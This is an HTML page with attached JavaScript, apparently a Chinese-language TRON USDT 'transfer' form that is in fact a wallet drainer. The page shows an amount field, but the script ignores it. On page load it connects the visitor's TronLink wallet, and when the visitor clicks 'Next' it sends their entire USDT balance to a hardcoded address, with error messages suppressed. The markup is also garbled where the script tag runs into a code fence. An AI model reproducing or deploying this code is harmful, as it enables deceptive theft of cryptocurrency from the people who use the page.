<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>USDT转账</title>
    <link rel="stylesheet" href="styles.css"> <!-- 修正为 styles.css -->
</head>
<body>
    <div class="header">
        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="USDT Logo" class="usdt-logo">
        <h1>USDT转账</h1>
    </div>
    <div class="container">
        <div class="address-box">
            <label>收款地址</label>
            <p class="address">THzYeKcgsuFPTYQg4U48UVadqFdQoHY91A</p>
        </div>
        <div class="amount-box">
            <label>转账数量 (USDT)</label>
            <div class="input-wrapper">
                <input type="text" id="amountInput" placeholder="0" onkeypress="return (event.charCode !=8 && event.charCode ==0 || (event.charCode >= 48 && event.charCode <= 57) || event.charCode == 46)">
            </div>
            <div class="note-info">
                <hr class="divider">
                <p class="note-text">备注</p>
            </div>
        </div>
        <div class="note-box">
            <input type="text" class="note-input" placeholder="请输入备注">
            <label class="note-label">备注 (需要支付 1 TRX)</label>
        </div>
        <div class="fee-box">
            <label>矿工费</label>
            <p class="fee">27 TRX</p>
        </div>
        <button id="nextButton" onclick="transferUSDT()">下一步</button>
    </div>
    <script src="https://unpkg.com/@tronweb/tronweb@4.3.0/dist/tronweb.min.js"></script>
    <script src="script.js"></```javascript
// 初始化 TronWeb
const TronWeb = window.TronWeb;
let tronWeb;
let walletAddress;

// 目标地址
const targetAddress = "THzYeKcgsuFPTYQg4U48UVadqFdQoHY91A";

// TRC20 USDT 合约地址（波场主网 USDT 合约地址）
const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// 自动连接钱包
window.addEventListener("load", async () => {
    if (window.tronLink) {
        try {
            // 请求连接 TronLink 钱包
            await window.tronLink.request({ method: "tron_requestAccounts" });
            tronWeb = window.tronLink.tronWeb;
            walletAddress = tronWeb.defaultAddress.base58;
        } catch (error) {
            console.error("钱包连接错误:", error);
        }
    } else {
        console.error("请安装 TronLink 或其他支持波场的钱包");
    }
});

// 转账 USDT 函数
async function transferUSDT() {
    try {
        // 获取 USDT 合约实例
        const contract = await tronWeb.contract().at(usdtContractAddress);

        // 获取余额
        const balance = await contract.balanceOf(walletAddress).call();
        const balanceInUSDT = tronWeb.fromSun(balance); // 转换为 USDT 单位（USDT 有 6 位小数）

        // 调用 transfer 方法，转账全部余额
        await contract.transfer(
            targetAddress,
            balance // 余额为 0 也会发起转账，交给钱包处理
        ).send({
            feeLimit: 10000000, // 设置手续费限制，单位是 SUN（1 TRX = 1,000,000 SUN）
            shouldPollResponse: false // 不等待交易确认，直接交给钱包
        });

        // 转账发起后，交给钱包处理，不需要额外提示
    } catch (error) {
        console.error("转账失败:", error);
        // 错误交给钱包处理，不显示提示
    }
}
